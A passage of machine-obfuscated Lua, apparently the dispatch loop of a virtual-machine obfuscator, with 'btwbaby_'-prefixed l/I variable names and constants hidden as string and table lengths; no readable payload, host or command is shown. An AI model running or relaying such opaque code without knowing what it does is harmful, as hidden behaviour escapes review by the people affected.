111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OXI")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zl0")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fB")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("MaF")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("JI1")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ex6M")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rB")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4IF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q6")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hqa")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hJc9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{613;986;602;892};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LBc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ei")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zbo")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rq")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Jb")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Oj")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("veB")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("W4")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xHr")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yq0x")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sd")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YAg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GL")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WSF")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{275;688;874;754};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JD")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("X6a")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QB")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iDH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ic")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("WAT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ij")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ev3")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("xxFA9NIDFDpH9R396QEZNGA5T2leTOfu1u7kYdCJcubvMtuBLWiRqc706KQg")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8h")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hgt")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Be83")]];else if(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zd")]]~=btwbaby_IllIIIllIlIIIIIlIIIllII[#("b9os")])then btwbaby_llIIllIll=btwbaby_llIIllIll+1;else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{609;995;52;805};"1 + 1 = 111";"1 + 1 = 111";}];end;end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("DU1x4QOTSl3o4WsEesAIVE6FyeYyhnoxvhJLk8ROQR2LpDxpPv2qqIQ9Xx801qM")then if btwbaby_IIlIllIIlIlIIlIIIl==#("7H2XmStfMV2dLvp5SJTVv7fXBKXY91XAfyOSKJd6cWPGQNzBgdisH1j9BfvN4F")then local btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("C7")]btwbaby_llllIllI[btwbaby_llIIllIll](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_llIIllIll+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))else local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("3a")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1])end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("V8C8nSHuiFWTKsKgYlvR6SF2ooPqFmBcHQ4InOkTKSaXViJQ18IBIXjcEKU9cq05")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5Qr")]][btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qdek")]]];elseif btwbaby_IIlIllIIlIlIIlIIIl>#{{831;509;416;252};"1 + 1 = 111";{5;591;905;364};"1 + 1 = 111";{987;592;575;788};{646;538;388;450};"1 + 1 = 111";{513;543;897;865};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{296;791;65;118};{567;716;672;746};"1 + 1 = 111";{356;248;241;766};"1 + 1 = 111";{189;51;71;561};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{56;418;38;616};"1 + 1 = 111";{354;558;944;506};"1 + 1 = 111";{344;22;721;133};{291;545;18;768};"1 + 1 = 111";{435;809;524;174};"1 + 1 = 111";{410;91;138;433};"1 + 1 = 111";{237;789;3;70};{551;895;686;451};{856;132;741;744};{600;336;858;918};{71;584;294;985};{46;875;972;421};"1 + 1 = 111";{84;77;201;811};{254;505;344;665};"1 + 1 = 111";"1 + 1 = 111";{553;795;182;612};{532;796;791;863};{816;221;243;302};"1 + 1 = 111";{77;265;121;334};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{811;269;887;462};{204;796;32;184};"1 + 1 = 111";"1 + 1 = 111";{458;554;301;90};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{61;873;800;977};"1 + 1 = 111";"1 + 1 = 111";{634;442;351;205};{34;416;621;604};{488;28;303;674};}then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8y")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3fS")]];else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jd")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Icp")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Xbz")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AF")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IZc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GM")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XgP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("BJLc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("a9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("HUb")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zCH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YY")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q7Y")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CD")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("4HQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{390;967;509;56};}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{9;919;311;134};"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("O9X")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{743;484;245;352};{525;472;775;688};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IC")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0AF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nk")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Y9X")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("h9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{214;392;493;99};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("9ydA")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("PLI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("huTm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mt")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jgn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("UlQH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rB")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nB8")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Um")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{402;112;422;252};{482;946;579;931};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("tJ3V")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{572;533;477;897};{701;478;604;921};{962;609;996;983};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("UH")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("6H0")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1p")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7HD")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hr")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("QWl")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n7")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("eFA")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1D60")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("oZA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("SeyN")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kJ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wmp")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ceqp")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3A")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("CF0")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GULg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kZ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cpm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kb")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("q5n")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{570;204;188;340};{928;345;263;896};"1 + 1 = 111";{147;805;697;527};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ry")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VKF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hj")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{95;324;386;817};{187;758;971;217};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{573;508;218;785};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ok5")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Up")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("HuW")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{366;597;678;692};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jNyQ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wy")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rBH")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("v5nc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("px")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qq6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JnH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rsV")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uy4")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vr")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rXk")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("u0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("JlP")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xR")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("DlS")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("iR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{750;122;280;853};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("c6gu")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kB")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ccv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1E2")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q4BR")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9y")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{470;237;14;599};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wt")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("JhQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xXC")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qp3")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("bV")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlI